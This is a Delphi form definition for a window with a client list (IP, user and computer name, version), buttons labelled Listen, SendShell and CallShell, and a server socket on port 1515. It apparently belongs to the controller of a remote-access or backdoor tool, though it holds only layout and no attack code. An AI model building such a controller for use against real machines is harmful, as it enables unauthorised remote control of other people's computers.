object Form1: TForm1
  Left = 0
  Top = 0
  Caption = 'Form1'
  ClientHeight = 346
  ClientWidth = 714
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  PixelsPerInch = 96
  TextHeight = 13
  object ListView1: TListView
    Left = 0
    Top = 0
    Width = 714
    Height = 305
    Align = alClient
    Columns = <
      item
        AutoSize = True
        Caption = 'IP'
      end
      item
        AutoSize = True
        Caption = 'User @ Computername'
      end
      item
        AutoSize = True
        Caption = 'Version'
        MaxWidth = 80
      end>
    GridLines = True
    ReadOnly = True
    RowSelect = True
    TabOrder = 0
    ViewStyle = vsReport
  end
  object Panel1: TPanel
    Left = 0
    Top = 305
    Width = 714
    Height = 41
    Align = alBottom
    TabOrder = 1
    object Button1: TButton
      Left = 8
      Top = 6
      Width = 89
      Height = 27
      Caption = 'Listen'
      TabOrder = 0
      OnClick = Button1Click
    end
    object Button2: TButton
      Left = 103
      Top = 6
      Width = 89
      Height = 27
      Caption = 'SendShell'
      TabOrder = 1
      OnClick = Button2Click
    end
    object Button3: TButton
      Left = 198
      Top = 6
      Width = 89
      Height = 27
      Caption = 'CallShell'
      TabOrder = 2
      OnClick = Button3Click
    end
  end
  object ServerSocket1: TServerSocket
    Active = False
    Port = 1515
    ServerType = stNonBlocking
    OnListen = ServerSocket1Listen
    OnClientConnect = ServerSocket1ClientConnect
    OnClientDisconnect = ServerSocket1ClientDisconnect
    OnClientRead = ServerSocket1ClientRead
    OnClientError = ServerSocket1ClientError
    Left = 184
    Top = 112
  end
end
